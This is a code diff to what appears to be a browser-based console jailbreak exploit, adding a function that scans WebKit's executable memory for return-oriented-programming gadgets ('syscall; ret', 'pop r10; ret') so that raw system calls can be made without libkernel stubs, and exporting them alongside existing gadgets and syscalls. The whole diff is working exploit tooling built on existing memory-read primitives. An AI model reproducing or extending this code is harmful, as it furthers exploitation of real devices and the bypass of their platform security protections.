@@ -217,6 +217,44 @@ async function prepare(p) {
         p.write1(waddr, 0x0);
     }
 
+    // [raw syscall] Some syscalls have NO libkernel C stub (e.g. 727/0x2D7
+    // GET_AIO_DEBUG_REQUEST_INFO). To call them in stub mode we scan WebKit
+    // .text (readable, our own module) for `syscall;ret` (0f 05 c3) and
+    // `pop r10;ret` (41 5a c3); with the X1NON pop-rax/arg pops and
+    // `mov [rdi],rax`, the classic pop-rax chain works without libkernel.
+    let rawSyscall = false;
+    function scanWkPat(pat) {
+        const CHUNK = 0x2000, TOTAL = 0x2c7c000;
+        for (let off = 0; off < TOTAL; off += CHUNK) {
+            let view;
+            try {
+                view = array_from_address(libSceNKWebKitBase.add32(off),
+                    Math.min(CHUNK + 16, TOTAL - off));
+            } catch (e) { continue; }
+            let n = 0;
+            try { n = view.length; } catch (e) { n = 0; }
+            outer:
+            for (let i = 0; i + pat.length <= n; i++) {
+                for (let j = 0; j < pat.length; j++)
+                    if ((view[i + j] & 0xff) !== pat[j]) continue outer;
+                return libSceNKWebKitBase.add32(off + i);
+            }
+        }
+        return null;
+    }
+    try {
+        const gSyscall = scanWkPat([0x0f, 0x05, 0xc3]);
+        const gPopR10 = scanWkPat([0x41, 0x5a, 0xc3]);
+        if (gSyscall !== null) gadgets["syscall"] = gSyscall;
+        if (gPopR10 !== null) gadgets["pop r10"] = gPopR10;
+        rawSyscall = (gSyscall !== null);
+        jbmark(rawSyscall ? "WK-RAW-SYSCALL" : "WK-NO-RAW-SYSCALL",
+            "syscall=" + (gSyscall === null ? "none" : "0x" + gSyscall.toString())
+            + " popr10=" + (gPopR10 === null ? "none" : "0x" + gPopR10.toString()));
+    } catch (e) {
+        jbmark("WK-RAW-THREW", String(e && e.message || e).slice(0, 40));
+    }
+
     async function wait_for_worker() {
 
         return new Promise((resolve) => {
@@ -312,6 +350,7 @@ async function prepare(p) {
         libKernelBase: libKernelBase,
         nogc: nogc,
         syscalls: syscalls,
+        rawSyscall: rawSyscall,
         gadgets: gadgets
     };
 
